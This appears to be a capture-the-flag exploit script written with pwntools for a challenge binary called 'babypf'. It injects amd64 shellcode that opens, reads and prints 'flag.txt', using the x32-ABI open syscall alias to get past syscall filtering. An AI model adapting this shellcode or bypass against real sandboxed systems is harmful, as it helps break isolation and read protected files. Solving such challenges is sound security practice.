#!/usr/bin/env python
from pwn import *

context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./babypf')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata)
sa = lambda recvdata, senddata : p.sendafter(recvdata, senddata)
sl = lambda senddata : p.sendline(senddata)
sla = lambda recvdata, senddata : p.sendlineafter(recvdata, senddata)
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata, timeout=timeout)
uu32 = lambda data : u32(data, signed='unsigned')
uu64 = lambda data : u64(data, signed='unsigned')
iu32 = lambda data : u32(data, signed='signed')
iu64 = lambda data : u64(data, signed='signed')
up32 = lambda data : p32(data, signed='unsigned')
up64 = lambda data : p64(data, signed='unsigned')
ip32 = lambda data : p32(data, signed='signed')
ip64 = lambda data : p64(data, signed='signed')

local = 1
if local:
    p = process([elf.path])
else:
    p = remote('localhost', 8888)

#gdb.attach(p)

sh = asm('''
    xor rax, rax
    push rax
    mov rax, 0x7478742e67616c66
    push rax
    mov rdi, rsp
    xor rsi, rsi
    mov rax, 0x40000002
    syscall
    mov rdi, rax
    lea rsi, [rsp]
    mov rdx, 0x40
    mov rax, 0
    syscall
    mov rdi, 1
    mov rdx, rax
    mov rax, 1
    syscall
    xor rdi, rdi
    mov rax, 0x3c
    syscall
''')
sa('LOAD PROGRAM\n', up32(len(sh)))
s(sh)

p.interactive()

